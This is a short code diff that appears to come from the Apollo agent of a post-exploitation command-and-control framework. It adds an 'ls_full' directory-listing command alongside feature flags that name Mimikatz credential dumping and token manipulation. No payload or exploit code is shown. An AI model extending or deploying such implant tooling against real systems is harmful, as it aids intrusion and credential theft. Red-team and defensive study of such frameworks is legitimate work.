@@ -39,6 +39,8 @@
 #define KILL
 #undef LS
 #define LS
+#undef LS_FULL
+#define LS_FULL
 #undef MAKE_TOKEN
 #define MAKE_TOKEN
 #undef MIMIKATZ
@@ -307,6 +309,9 @@ namespace Apollo
 #if LS
 
                 { "ls", "DirectoryList" },
+#endif
+#if LS_FULL
+                { "ls_full", "DirectoryList" },
 #endif
 #if MAKE_TOKEN
 
